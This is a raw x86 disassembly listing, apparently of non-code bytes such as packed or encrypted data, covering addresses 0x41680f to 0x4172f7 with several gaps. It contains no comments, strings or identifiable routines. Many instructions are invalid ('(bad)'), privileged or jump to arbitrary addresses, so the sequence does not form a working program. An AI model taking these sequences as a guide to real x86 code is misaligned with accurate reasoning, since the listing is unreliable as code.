  41680f:	ins    DWORD PTR es:[edi],dx
  416810:	daa    
  416811:	ds pusha 
  416813:	dec    edi
  416814:	mov    ecx,0xd652b06a
  416819:	es rol bl,0x24
  41681d:	add    eax,0x2adef147
  416822:	pop    edx
  416823:	stos   DWORD PTR es:[edi],eax
  416824:	cs lahf 
  416826:	out    0xb5,eax
  416828:	mov    eax,ds:0x89c1ec7e
  41682d:	mov    ecx,0x9c275758
  416832:	repnz (bad) 
  416834:	arpl   WORD PTR ds:0xaa0f279d,bx
  41683a:	mov    esp,0x299855ee
  41683f:	aam    0x7d
  416841:	inc    ebx
  416842:	aam    0x85
  416844:	ins    BYTE PTR es:[edi],dx
  416845:	xchg   DWORD PTR ds:0x2a2e9f6d,edi
  41684b:	inc    edi
  41684c:	pop    es
  41684d:	sti    
  41684e:	cmp    al,0xc6
  416850:	mov    edi,0x1850cde9
  416855:	pop    edi
  416856:	pop    ss
  416857:	mov    ecx,0xe22c6f6a
  41685c:	outs   dx,BYTE PTR ds:[esi]
  41685d:	adc    al,0x5e
  41685f:	sub    ecx,DWORD PTR [esi+ecx*2]
  416862:	imul   eax,edx,0x6786abcc
  416868:	test   eax,0xe360d57d
  41686d:	push   edi
  41686e:	ret    0x5bd2
  416871:	sub    al,0x87
  416873:	lods   al,BYTE PTR ds:[esi]
  416874:	mov    ebx,0x9e7a0253
  416879:	dec    esi
  41687a:	enter  0x2466,0xb0
  41687e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41687f:	fdivrp st(3),st
  416881:	sbb    ch,BYTE PTR [esi-0x353ac455]
  416887:	jmp    0xa0f130ca
  41688c:	cmc    
  41688d:	stos   DWORD PTR es:[edi],eax
  41688e:	mov    ds:0xd5a3cd9,al
  416893:	cs mov dl,0xd6
  416896:	je     0x416873
  416898:	pop    edx
  416899:	dec    esi
  41689a:	inc    edx
  41689b:	jmp    0xbe8940c
  4168a0:	mov    ebp,0xd3f64473
  4168a5:	test   ah,0x73
  4168a8:	pushf  
  4168a9:	into   
  4168aa:	push   edi
  4168ab:	loop   0x4168a5
  4168ad:	stos   DWORD PTR es:[edi],eax
  4168ae:	dec    edi
  4168af:	(bad)  
  4168b0:	jmp    0x416912
  4168b2:	lea    esp,[ebp-0x5339450f]
  4168b8:	xor    bh,BYTE PTR [ebx]
  4168ba:	ins    DWORD PTR es:[edi],dx
  4168bb:	pop    es
  4168bc:	fucompp 
  4168be:	or     bh,0x6
  4168c1:	jnp    0x4168c3
	...
  416933:	add    BYTE PTR [ebp-0x78],al
  416936:	sub    al,0x77
  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    DWORD PTR [eax],esp
  416941:	xchg   ecx,esi
  416943:	push   edi
  416944:	fdiv   st,st(6)
  416946:	add    BYTE PTR [eax],al
  416948:	test   BYTE PTR [eax],0x0
  41694b:	add    ch,bh
  41694d:	imul   dh
  41694f:	loop   0x41694f
  416951:	mov    dl,0x50
  416953:	mov    esi,0x54d42cbc
  416958:	jo     0x41693a
  41695a:	icebp  
  41695b:	mov    edi,0xeabea5b0
  416960:	xor    eax,0xfe73c343
  416965:	cmp    DWORD PTR [ecx+0x2f4e5f1],eax
  41696b:	std    
  41696c:	add    dl,BYTE PTR [ebp-0x2d]
  41696f:	jmp    0x416926
  416971:	jb     0x4169e0
  416973:	psubsb mm7,QWORD PTR [ecx-0x2bdeecfc]
  41697a:	jg     0x41691a
  41697c:	pusha  
  41697d:	in     eax,0x8c
  41697f:	call   0xca132934
  416984:	pop    edx
  416985:	ret    0xab05
  416988:	fidiv  WORD PTR [ebp+0x1dff7c]
  41698e:	push   esi
  41698f:	clc    
  416990:	retf   
  416991:	data16 fstp QWORD PTR [ecx]
  416994:	jp     0x41698d
  416996:	rol    DWORD PTR [edx+0x495ab856],0x9c
  41699d:	xchg   esi,eax
  41699e:	call   0x861c:0x404c804f
  4169a5:	sti    
  4169a6:	lods   al,BYTE PTR ss:[esi]
  4169a8:	enter  0x852b,0x71
  4169ac:	jmp    0xdfa50e3b
  4169b1:	or     ah,ah
  4169b3:	push   eax
  4169b4:	pop    es
  4169b5:	add    bl,BYTE PTR [eax]
  4169b7:	jmp    0x416a06
  4169b9:	push   esi
  4169ba:	jmp    0xe420804e
  4169bf:	ficomp WORD PTR [esi]
  4169c1:	shl    DWORD PTR [edi+ebp*8-0x51d2b24c],0x3d
  4169c9:	cmc    
  4169ca:	ficomp WORD PTR [edi-0xfe5e15f]
  4169d0:	lods   al,BYTE PTR ds:[esi]
  4169d1:	push   ds
  4169d2:	adc    DWORD PTR [ebx+0x31888ae5],esp
  4169d8:	das    
  4169d9:	push   eax
  4169da:	not    BYTE PTR [eax-0x535bca07]
  4169e0:	test   eax,0x7f8a74d8
  4169e5:	xor    dh,bh
  4169e7:	inc    eax
  4169e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169e9:	shr    BYTE PTR [edx+0x336fee1c],1
  4169ef:	in     eax,0xe8
  4169f1:	dec    esi
  4169f2:	cli    
  4169f3:	xor    DWORD PTR ss:[edx-0x14],esi
  4169f7:	stos   DWORD PTR es:[edi],eax
  4169f8:	in     eax,dx
  4169f9:	mov    dh,0xe3
  4169fb:	adc    ecx,edi
  4169fd:	dec    ecx
  4169fe:	adc    al,0xc3
  416a00:	dec    esi
  416a01:	push   0x2f
  416a03:	pop    edx
  416a04:	cwde   
  416a05:	jo     0x4169a4
  416a07:	sub    eax,0x9be4943a
  416a0c:	jp     0x41699a
  416a0e:	leave  
  416a0f:	push   ecx
  416a10:	sbb    eax,0x201b564b
  416a15:	fbstp  TBYTE PTR [ebx-0x57dab40b]
  416a1b:	invd   
  416a1d:	sub    al,0x83
  416a1f:	xchg   edi,eax
  416a20:	jnp    0x416a87
  416a22:	sbb    BYTE PTR [ebx],0x78
  416a25:	sbb    DWORD PTR [esi],0xdc694412
  416a2b:	cld    
  416a2c:	rcr    BYTE PTR [esi-0x7a],cl
  416a2f:	test   eax,0xd660bd0e
  416a34:	int    0xc
  416a36:	fs out 0xa6,al
  416a39:	or     esp,DWORD PTR [ebx+0x763ad8ee]
  416a3f:	jae    0x416a12
  416a41:	jno    0x416a43
	...
  416ab3:	add    bh,bl
  416ab5:	mov    esi,0xbb659205
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx+0x49efc052]
  416ac3:	mov    dh,cl
  416ac5:	test   DWORD PTR [eax],0xf600
  416acb:	add    BYTE PTR [esi],dl
  416acd:	dec    ebx
  416ace:	xchg   edx,eax
  416acf:	scas   eax,DWORD PTR es:[edi]
  416ad0:	ins    DWORD PTR es:[edi],dx
  416ad1:	push   ecx
  416ad2:	test   BYTE PTR ds:0xbf879cee,dl
  416ad8:	pushf  
  416ad9:	xchg   BYTE PTR [ecx+0x58],ah
  416adc:	aas    
  416add:	push   0x8f036107
  416ae2:	inc    ebx
  416ae3:	enter  0xb346,0x72
  416ae7:	(bad)  
  416ae8:	in     eax,dx
  416ae9:	jnp    0x416b02
  416aeb:	cmc    
  416aec:	jp     0x416aeb
  416aee:	sahf   
  416aef:	dec    eax
  416af0:	loope  0x416b35
  416af2:	lahf   
  416af3:	jge    0x416ac2
  416af5:	retf   
  416af6:	lahf   
  416af7:	nop
  416af8:	cs mov eax,cs:0xad45170f
  416aff:	shr    dl,0x9b
  416b02:	ins    BYTE PTR es:[edi],dx
  416b03:	jl     0x416ac1
  416b05:	cdq    
  416b06:	adc    eax,0xbd8721b0
  416b0b:	arpl   WORD PTR [ecx+0x15],dx
  416b0e:	mov    al,ds:0xa15f75db
  416b13:	inc    ebx
  416b14:	gs pop esi
  416b16:	push   cs
  416b17:	retf   
  416b18:	inc    ebp
  416b19:	dec    edx
  416b1a:	push   0x2b655f48
  416b1f:	push   eax
  416b20:	lock in eax,0x41
  416b23:	or     BYTE PTR [esp+edx*2+0x150b56ce],ah
  416b2a:	imul   esp,DWORD PTR [ebp-0x1f],0xfffffff5
  416b2e:	pop    ebp
  416b2f:	sahf   
  416b30:	cdq    
  416b31:	ins    DWORD PTR es:[edi],dx
  416b32:	jl     0x416b79
  416b34:	cwde   
  416b35:	popa   
  416b36:	and    al,0x4e
  416b38:	dec    edi
  416b39:	ins    BYTE PTR es:[edi],dx
  416b3a:	pop    esp
  416b3b:	rcl    DWORD PTR [ecx+0x6d],1
  416b3e:	mul    DWORD PTR [esi-0x4cc9534f]
  416b44:	push   esi
  416b45:	gs xor al,bl
  416b48:	jg     0x416b93
  416b4a:	mov    ?,WORD PTR [ebx+0xa24c970]
  416b50:	gs dec esp
  416b52:	xchg   edi,eax
  416b53:	mov    dh,0xa5
  416b55:	push   esp
  416b56:	popa   
  416b57:	mov    esp,0x9ae47e5a
  416b5c:	fdiv   DWORD PTR [edx+0x74]
  416b5f:	lock sbb BYTE PTR [ecx+0x69],0x83
  416b64:	add    eax,DWORD PTR [ebp-0x4997c461]
  416b6a:	loopne 0x416bbd
  416b6c:	jg     0x416b82
  416b6e:	rcr    DWORD PTR [edx],cl
  416b70:	cmp    eax,DWORD PTR [esi]
  416b72:	sbb    eax,0x20ceb428
  416b77:	sub    eax,0x2b88e89f
  416b7c:	mov    ebp,0x97855536
  416b81:	pop    es
  416b82:	(bad)  
  416b83:	mov    ch,0xdc
  416b85:	jmp    0x2995ea3b
  416b8a:	and    edx,DWORD PTR [esi]
  416b8c:	js     0x416bff
  416b8e:	jecxz  0x416b8f
  416b90:	cwde   
  416b91:	mov    bh,0x79
  416b93:	fiadd  DWORD PTR ds:0x7eb2fd01
  416b99:	mov    gs,WORD PTR [eax+esi*1+0x5e]
  416b9d:	sbb    dl,BYTE PTR [esi-0x3f]
  416ba0:	sub    cl,0xbd
  416ba3:	mov    al,0x10
  416ba5:	pusha  
  416ba6:	jae    0x416b80
  416ba8:	push   esi
  416ba9:	cmp    BYTE PTR [ecx],0xd9
  416bac:	mov    eax,0x236b970a
  416bb1:	mov    ebp,0xb9b9b46b
  416bb6:	iret   
  416bb7:	call   0x6cd3:0xdf689e50
  416bbe:	les    edi,FWORD PTR [edi]
  416bc0:	xor    BYTE PTR [esi+0x0],ah
	...
  416c33:	add    BYTE PTR [edx],bh
  416c35:	adc    BYTE PTR [edi-0x444040c4],bh
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    ebp,edx
  416c41:	or     cl,al
  416c43:	retf   0xf8c4
  416c46:	add    BYTE PTR [eax],al
  416c48:	test   BYTE PTR [eax],0x0
  416c4b:	add    dl,ch
  416c4d:	sub    eax,0xb6cba4c4
  416c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c53:	or     ebp,0xc7faf049
  416c59:	adc    DWORD PTR [edi-0xa],eax
  416c5c:	loope  0x416cca
  416c5e:	xor    esp,DWORD PTR es:[ecx-0x57007052]
  416c65:	loope  0x416ca0
  416c67:	sahf   
  416c68:	not    DWORD PTR [ebx+0x15]
  416c6b:	adc    ebp,DWORD PTR [ebx]
  416c6d:	inc    esp
  416c6e:	shr    DWORD PTR [esi-0x17bf3dde],1
  416c74:	jl     0x416cb7
  416c76:	or     ebp,DWORD PTR [esi-0x592778e7]
  416c7c:	in     al,0xf
  416c7e:	out    dx,al
  416c7f:	pop    ebp
  416c80:	test   BYTE PTR [eax-0x2b6afef8],bl
  416c86:	jp     0x416c8a
  416c88:	(bad)  
  416c89:	push   edi
  416c8a:	sti    
  416c8b:	xor    esp,ecx
  416c8d:	(bad)  
  416c8e:	outs   dx,BYTE PTR ds:[esi]
  416c8f:	cmp    ah,BYTE PTR [edx-0x52e25d79]
  416c95:	push   es
  416c96:	or     edx,DWORD PTR [edi+0x78]
  416c99:	aam    0x5e
  416c9b:	(bad)  
  416c9c:	rol    BYTE PTR [edi+ebp*8],0x93
  416ca0:	dec    esi
  416ca1:	jl     0x416c69
  416ca3:	in     al,0xef
  416ca5:	pop    edi
  416ca6:	adc    ebx,DWORD PTR [edx+0x54e30a80]
  416cac:	sbb    ebp,esp
  416cae:	outs   dx,DWORD PTR ds:[esi]
  416caf:	stos   BYTE PTR es:[edi],al
  416cb0:	add    eax,0x9a0757d7
  416cb5:	push   ds
  416cb6:	xor    esp,esp
  416cb8:	shl    BYTE PTR [ebx-0x638a788f],cl
  416cbe:	(bad)  
  416cbf:	fidivr WORD PTR [esi+0x531deb]
  416cc5:	sbb    ebx,DWORD PTR ds:0xeb90d321
  416ccb:	xor    ecx,DWORD PTR [ecx+0x5e41e80a]
  416cd1:	inc    edi
  416cd2:	xor    BYTE PTR [eax-0x42],0xc6
  416cd6:	or     eax,0x76fc87e7
  416cdb:	mov    ah,0x38
  416cdd:	sub    al,0x3
  416cdf:	shr    DWORD PTR [edi],cl
  416ce1:	pop    ds
  416ce2:	jae    0x416c85
  416ce4:	jp     0x416cc7
  416ce6:	fmulp  st(6),st
  416ce8:	pop    es
  416ce9:	inc    ecx
  416cea:	test   al,0x59
  416cec:	in     eax,0x1a
  416cee:	aad    0x7
  416cf0:	or     DWORD PTR [esi+0x6c],edi
  416cf3:	imul   esp,DWORD PTR [ebp-0x33ef8c41],0xffffff9b
  416cfa:	out    dx,al
  416cfb:	cwde   
  416cfc:	mov    esi,0xb079d3eb
  416d01:	sub    DWORD PTR [eax-0xd],ebx
  416d04:	lea    esp,[eax+ebx*2+0x5b]
  416d08:	or     BYTE PTR [eax],cl
  416d0a:	push   ds
  416d0b:	adc    DWORD PTR [eax-0x11],ecx
  416d0e:	mov    al,ds:0x6cb9b576
  416d13:	sub    BYTE PTR [eax-0x4e4c096c],0x7a
  416d1a:	das    
  416d1b:	sbb    BYTE PTR [ebx+eax*4-0x5b],dl
  416d1f:	scas   eax,DWORD PTR es:[edi]
  416d20:	into   
  416d21:	dec    ebp
  416d22:	call   0xeaa8:0xc6a10faa
  416d29:	add    ch,BYTE PTR [eax-0x66]
  416d2c:	mov    ecx,0xc28ff02d
  416d31:	inc    ebp
  416d32:	retf   
  416d33:	mov    ecx,0x4d5ffec5
  416d38:	inc    edx
  416d39:	mov    dh,0xea
  416d3b:	retf   0x8500
  416d3e:	mov    DWORD PTR [ecx+0x827b],esp
	...
  416db4:	out    dx,al
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0xa28ded8c
  416dc4:	mov    edx,0xf60000f9
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    BYTE PTR [edi+eax*4],ch
  416dce:	(bad)  
  416dcf:	into   
  416dd0:	fsubrp st(3),st
  416dd2:	sbb    eax,0x70db5edf
  416dd7:	sub    dl,ch
  416dd9:	mov    ebx,0xe5f8ac04
  416dde:	out    dx,eax
  416ddf:	inc    eax
  416de0:	in     eax,0x5e
  416de2:	jmp    0xa38e:0x52eb3c53
  416de9:	cmp    ebx,eax
  416deb:	pop    edx
  416dec:	and    BYTE PTR [ecx+0x22],dl
  416def:	dec    ebx
  416df0:	fwait
  416df1:	arpl   si,si
  416df3:	ss push ebx
  416df5:	xor    al,0xbb
  416df7:	inc    eax
  416df8:	retf   
  416df9:	mov    bl,0xb
  416dfb:	jno    0x416e6e
  416dfd:	dec    eax
  416dfe:	sub    eax,0xdddaa508
  416e03:	ss popa 
  416e05:	dec    ebx
  416e06:	outs   dx,BYTE PTR ds:[esi]
  416e07:	xor    BYTE PTR [esi*2+0x624d4795],cl
  416e0e:	stos   DWORD PTR es:[edi],eax
  416e0f:	shr    BYTE PTR [eax],1
  416e11:	add    al,0x49
  416e13:	jne    0x416e06
  416e15:	mov    ebx,0x1d4aecab
  416e1a:	cmp    al,0x57
  416e1c:	add    ah,dh
  416e1e:	aas    
  416e1f:	mov    dh,0x93
  416e21:	stos   DWORD PTR es:[edi],eax
  416e22:	(bad)  
  416e23:	leave  
  416e24:	imul   edi,eax,0x64b35fbb
  416e2a:	ds cld 
  416e2c:	jecxz  0x416eaa
  416e2e:	sbb    eax,0xcaad5d88
  416e33:	lock or DWORD PTR [ecx],esi
  416e36:	enter  0x5ab3,0x8a
  416e3a:	xor    DWORD PTR [ebx],esp
  416e3c:	pop    ebp
  416e3d:	or     DWORD PTR [edx-0x50],ecx
  416e40:	jp     0x416e09
  416e42:	xchg   ebp,eax
  416e43:	pop    es
  416e44:	mov    bh,0x99
  416e46:	fisttp WORD PTR [ecx-0x17]
  416e49:	adc    ecx,DWORD PTR [ecx]
  416e4b:	rcr    ebp,0xd0
  416e4e:	dec    edx
  416e4f:	call   0xfc4f:0xe2cec8f6
  416e56:	ficom  WORD PTR [esi-0x2116cbf9]
  416e5c:	push   ss
  416e5d:	mov    eax,0x4415ad32
  416e62:	pop    fs
  416e64:	mov    dh,0xd9
  416e66:	cmp    edi,DWORD PTR [ebx+0x6dec441a]
  416e6c:	adc    eax,DWORD PTR [ecx+0x5e]
  416e6f:	lea    eax,[eax+edi*8+0x1]
  416e73:	lock out dx,eax
  416e75:	jge    0x416e3c
  416e77:	enter  0x698d,0x56
  416e7b:	repz das 
  416e7d:	and    eax,0x1ebcf539
  416e82:	cmp    eax,0x7636fc9c
  416e88:	cs push edi
  416e8a:	in     eax,dx
  416e8b:	imul   ecx,DWORD PTR [edi-0x73f934f6],0x1690f023
  416e95:	iret   
  416e96:	stos   DWORD PTR es:[edi],eax
  416e97:	cmp    DWORD PTR [ebp-0x51],ebx
  416e9a:	jae    0x416e98
  416e9c:	jnp    0x416e28
  416e9e:	mov    edi,0xf571e5aa
  416ea3:	lods   al,BYTE PTR ds:[esi]
  416ea4:	fst    DWORD PTR [esi+0x52a10330]
  416eaa:	lock int 0x15
  416ead:	xor    edi,DWORD PTR [esi]
  416eaf:	push   ss
  416eb0:	into   
  416eb1:	fcom   QWORD PTR ss:[esi-0x1c]
  416eb5:	add    al,0xa2
  416eb7:	(bad)  
  416eb8:	outs   dx,DWORD PTR ds:[esi]
  416eb9:	push   eax
  416eba:	mov    ds:0xcf5e21c6,eax
  416ebf:	xchg   ebp,eax
  416ec0:	mov    ds:0x43,eax
	...
  416f31:	add    BYTE PTR [eax],al
  416f33:	add    BYTE PTR [edi],dl
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	rol    BYTE PTR [ebp-0x2f],1
  416f43:	into   
  416f44:	mov    al,0xfa
  416f46:	add    BYTE PTR [eax],al
  416f48:	test   BYTE PTR [eax],0x0
  416f4b:	add    BYTE PTR [eax-0x3381cdf8],ah
  416f51:	push   edi
  416f52:	imul   ebp,DWORD PTR [esi-0x38],0xffffff91
  416f56:	or     eax,0xe627674a
  416f5b:	push   edi
  416f5c:	in     al,0x96
  416f5e:	fwait
  416f5f:	push   ebx
  416f60:	gs test eax,0x7837e85
  416f66:	mov    WORD PTR [esp+ecx*8-0x126cf3be],?
  416f6d:	mov    ebx,ebx
  416f6f:	push   ebp
  416f70:	ins    BYTE PTR es:[edi],dx
  416f71:	es or  bh,bh
  416f74:	jo     0x416f75
  416f76:	xchg   esi,eax
  416f77:	xor    DWORD PTR [ecx+0x47],ebx
  416f7a:	pop    eax
  416f7b:	lds    ecx,FWORD PTR [edi+ebx*1+0x5dabce3d]
  416f82:	add    DWORD PTR cs:[ecx],0xae88cfbb
  416f89:	outs   dx,DWORD PTR ds:[esi]
  416f8a:	sbb    DWORD PTR [ebx-0x68861da],0xffffffa1
  416f91:	jno    0x416f5a
  416f93:	loopne 0x416f4d
  416f95:	sbb    BYTE PTR [edx-0x5f785958],bl
  416f9b:	pop    ecx
  416f9c:	outs   dx,DWORD PTR cs:[esi]
  416f9e:	push   esi
  416f9f:	adc    dl,BYTE PTR [ebp+eax*1-0x69]
  416fa3:	xchg   edx,eax
  416fa4:	es fcmovnbe st,st(2)
  416fa7:	test   al,0xed
  416fa9:	inc    ebx
  416faa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fab:	sahf   
  416fac:	mov    ch,0x44
  416fae:	mov    esi,0x1baddff9
  416fb3:	adc    DWORD PTR [ecx-0x2c],ebx
  416fb6:	adc    esi,eax
  416fb8:	pop    edx
  416fb9:	or     ecx,DWORD PTR [edx]
  416fbb:	push   cs
  416fbc:	push   cs
  416fbd:	mov    bl,0x96
  416fbf:	cli    
  416fc0:	loope  0x417002
  416fc2:	sbb    eax,0xf6a27fe7
  416fc7:	pusha  
  416fc8:	push   esi
  416fc9:	or     BYTE PTR ds:0x5b242905,0xb4
  416fd0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  416fd2:	mov    ch,BYTE PTR [eax]
  416fd4:	inc    esi
  416fd5:	les    edx,FWORD PTR [ecx+eax*1]
  416fd8:	mov    BYTE PTR [edx],dl
  416fda:	nop
  416fdb:	adc    dh,BYTE PTR [bx+si+0x1]
  416fdf:	xlat   BYTE PTR ds:[ebx]
  416fe0:	into   
  416fe1:	mov    ecx,0x4da3e385
  416fe6:	mov    ch,0x39
  416fe8:	lds    esp,FWORD PTR [edi+0x35]
  416feb:	cmp    eax,0xfc94d45
  416ff0:	mov    al,0x7
  416ff2:	nop
  416ff3:	xchg   esp,eax
  416ff4:	xchg   edx,eax
  416ff5:	mov    ah,BYTE PTR [eax]
  416ff7:	and    eax,0x2302135a
  416ffc:	cmp    bl,BYTE PTR [esi]
  416ffe:	das    
  416fff:	sbb    BYTE PTR [edx],bl
  417001:	loopne 0x41707f
  417003:	inc    eax
  417004:	test   ebp,edi
  417006:	adc    ebp,ecx
  417008:	or     BYTE PTR [ebx],ch
  41700a:	sub    BYTE PTR [ebx-0x67],0x93
  41700e:	test   eax,0x9650989e
  417013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417014:	xor    BYTE PTR [esi+0x2cc0c56f],dl
  41701a:	(bad)  
  41701b:	outs   dx,DWORD PTR ds:[esi]
  41701c:	stos   DWORD PTR es:[edi],eax
  41701d:	mov    cl,0xdc
  41701f:	into   
  417020:	cli    
  417021:	sub    DWORD PTR [ebp+0x7d],0x63ea37dc
  417028:	retf   0x2222
  41702b:	mov    eax,ds:0x394dea0a
  417030:	mov    ebp,0x2cb45c95
  417035:	sar    ebp,cl
  417037:	fisttp WORD PTR [esi+0x67d018b8]
  41703d:	mov    bl,0xa1
  41703f:	loopne 0x417089
  417041:	js     0x417043
	...
  4170b3:	add    BYTE PTR [eax],ah
  4170b5:	jmp    0xdf3d4ef5
  4170ba:	in     eax,0xff
  4170bc:	dec    ecx
  4170bd:	dec    ecx
  4170be:	ret    
  4170bf:	sub    DWORD PTR [edx-0x3b],0x42
  4170c3:	xchg   BYTE PTR [esi-0x9ffff05],ah
  4170c9:	add    BYTE PTR [eax],al
  4170cb:	add    BYTE PTR [esp+edx*1-0x68],bh
  4170cf:	pusha  
  4170d0:	test   ebx,ebx
  4170d2:	sub    BYTE PTR [edx],cl
  4170d4:	or     esp,DWORD PTR [edx]
  4170d6:	jns    0x417077
  4170d8:	aad    0xf5
  4170da:	add    esp,eax
  4170dc:	je     0x4170dd
  4170de:	mov    esi,0x7354f702
  4170e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170e4:	push   cs
  4170e5:	aad    0x56
  4170e7:	and    eax,DWORD PTR [esi-0x61f18e25]
  4170ed:	fcomp  QWORD PTR [eax-0x14]
  4170f0:	or     BYTE PTR [eax+0x664173d8],ch
  4170f6:	pop    edi
  4170f7:	mov    WORD PTR [eax+0x65],?
  4170fa:	inc    esp
  4170fb:	fwait
  4170fc:	loope  0x41716d
  4170fe:	enter  0x9f18,0xf5
  417102:	jg     0x4170db
  417104:	sbb    esi,DWORD PTR [esi-0x5b225896]
  41710a:	push   cs
  41710b:	mov    esi,0xe3d9acfd
  417110:	adc    esi,eax
  417112:	sti    
  417113:	xchg   eax,edx
  417115:	sbb    BYTE PTR [ebp-0x8],0xdc
  417119:	cmp    BYTE PTR [ebx],al
  41711b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41711c:	in     eax,0x54
  41711e:	push   ss
  41711f:	cmp    esi,edx
  417121:	outs   dx,DWORD PTR ds:[esi]
  417122:	push   ebx
  417123:	or     BYTE PTR [ebx-0xcd4cc39],cl
  417129:	mov    ecx,0x8bbdf508
  41712e:	and    eax,0x3fcddc57
  417133:	mov    WORD PTR [esp+ecx*4+0x32e9f4fc],es
  41713a:	mov    dl,0xc0
  41713c:	pop    ebp
  41713d:	dec    edx
  41713e:	daa    
  41713f:	pop    ebp
  417140:	in     al,dx
  417141:	mov    BYTE PTR [eax-0x1262f8f6],cl
  417147:	xchg   edx,eax
  417148:	push   0xffffff98
  41714a:	and    al,0xe1
  41714c:	outs   dx,DWORD PTR ds:[esi]
  41714d:	mov    bl,0xc4
  41714f:	cdq    
  417150:	repz inc eax
  417152:	push   cs
  417153:	sbb    al,dh
  417155:	mov    al,ds:0xb5c6b6f1
  41715a:	rol    ebp,1
  41715c:	mov    al,0x6a
  41715e:	lock and BYTE PTR [esi],bl
  417161:	lahf   
  417162:	sub    al,0x92
  417164:	jnp    0x4171dc
  417166:	ss sub eax,eax
  417169:	sahf   
  41716a:	xchg   BYTE PTR fs:[edx+0x58],ah
  41716e:	jo     0x41714c
  417170:	shl    DWORD PTR [esi-0x78],1
  417173:	call   0xbcd0:0xf29e3c8
  41717a:	cli    
  41717b:	pop    eax
  41717c:	xor    BYTE PTR [ecx-0x12],bh
  41717f:	stos   BYTE PTR es:[edi],al
  417180:	jae    0x417127
  417182:	cmp    ah,BYTE PTR [ebx]
  417184:	nop
  417185:	inc    eax
  417186:	and    DWORD PTR [edi+0x610b491c],esi
  41718c:	mov    eax,ds:0x402a0ad
  417191:	stos   DWORD PTR es:[edi],eax
  417192:	popf   
  417193:	jp     0x4171ed
  417195:	mov    esi,0x604e8fc9
  41719a:	fidiv  WORD PTR [edx]
  41719c:	cmp    al,0xd0
  41719e:	cdq    
  41719f:	push   eax
  4171a0:	dec    ebx
  4171a1:	xlat   BYTE PTR es:[ebx]
  4171a3:	mov    ebx,0xea549ac2
  4171a8:	and    bh,cl
  4171aa:	mov    bl,0xa9
  4171ac:	ins    DWORD PTR es:[edi],dx
  4171ad:	in     eax,0xb8
  4171af:	(bad)  
  4171b0:	mov    al,0x79
  4171b2:	xchg   esi,eax
  4171b3:	shl    bx,0x8f
  4171b7:	arpl   WORD PTR [esi],bx
  4171b9:	test   eax,0x31607bac
  4171be:	and    esp,DWORD PTR [esi+0x86b]
	...
  417234:	and    ebp,DWORD PTR [esi+0x32]
  417237:	and    eax,0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	data16 jge 0x417217
  417242:	push   esp
  417243:	sti    
  417244:	pushf  
  417245:	cld    
  417246:	add    BYTE PTR [eax],al
  417248:	test   BYTE PTR [eax],0x0
  41724b:	add    BYTE PTR [ecx+0x77],ah
  41724e:	push   eax
  41724f:	adc    eax,0x80fae1e7
  417254:	leave  
  417255:	cwde   
  417256:	add    BYTE PTR [edi],dh
  417258:	mov    dl,0xc7
  41725a:	outs   dx,BYTE PTR es:[esi]
  41725c:	icebp  
  41725d:	ret    
  41725e:	xor    ebp,DWORD PTR [edi]
  417260:	jbe    0x41729b
  417262:	(bad)  
  417263:	cli    
  417264:	push   edx
  417265:	mov    ds:0xfe1b8ba2,al
  41726a:	sti    
  41726b:	ficom  WORD PTR [esi-0x7376cdb5]
  417271:	int3   
  417272:	push   ebp
  417273:	cdq    
  417274:	aam    0x66
  417276:	int3   
  417277:	stc    
  417278:	and    esp,0x41
  41727b:	in     al,0x36
  41727d:	inc    edx
  41727e:	aaa    
  41727f:	mov    edi,0xb723c213
  417284:	test   BYTE PTR [ebp-0x64],dl
  417287:	and    ebp,DWORD PTR [edi-0x52fdacd5]
  41728d:	and    BYTE PTR [esi],cl
  41728f:	or     BYTE PTR [edi+0x1d9bf7f7],bl
  417295:	popf   
  417296:	lea    eax,[edx]
  417298:	adc    BYTE PTR [eax-0x18],bh
  41729b:	sub    DWORD PTR [ecx],ebp
  41729d:	fdivr  DWORD PTR [ebx+0x65]
  4172a0:	or     eax,0x67988d8
  4172a5:	mov    edx,0xf8790268
  4172aa:	(bad)  
  4172ab:	push   ecx
  4172ac:	sub    ebx,esp
  4172ae:	dec    esi
  4172af:	mov    bl,0xfb
  4172b1:	adc    ecx,DWORD PTR [ebp+0x15]
  4172b4:	sub    bl,dh
  4172b6:	cwde   
  4172b7:	sar    BYTE PTR [esp+ecx*4],1
  4172ba:	cmp    al,0x75
  4172bc:	out    dx,eax
  4172bd:	inc    esp
  4172be:	rcl    DWORD PTR [edx],cl
  4172c0:	mov    ch,BYTE PTR [edx]
  4172c2:	aaa    
  4172c3:	or     al,0xdf
  4172c5:	sub    dh,BYTE PTR [ebp-0x7912c0fa]
  4172cb:	or     edi,ecx
  4172cd:	mov    cl,0xdc
  4172cf:	mov    bl,0xf3
  4172d1:	fidiv  DWORD PTR [ecx-0x4a05fae7]
  4172d7:	push   esi
  4172d8:	xlat   BYTE PTR ds:[ebx]
  4172d9:	je     0x417274
  4172db:	inc    ebp
  4172dc:	dec    edi
  4172dd:	je     0x417352
  4172df:	stos   DWORD PTR es:[edi],eax
  4172e0:	out    0x5b,al
  4172e2:	ss dec ebx
  4172e4:	xchg   esi,eax
  4172e5:	sub    DWORD PTR [eax],0xefafd3c7
  4172eb:	sti    
  4172ec:	arpl   WORD PTR [ecx-0x56],sp
  4172ef:	js     0x417301
  4172f1:	sbb    DWORD PTR [edx+0x30cad5a5],edx
  4172f7:	lods   al,BYTE PTR ds:[esi]
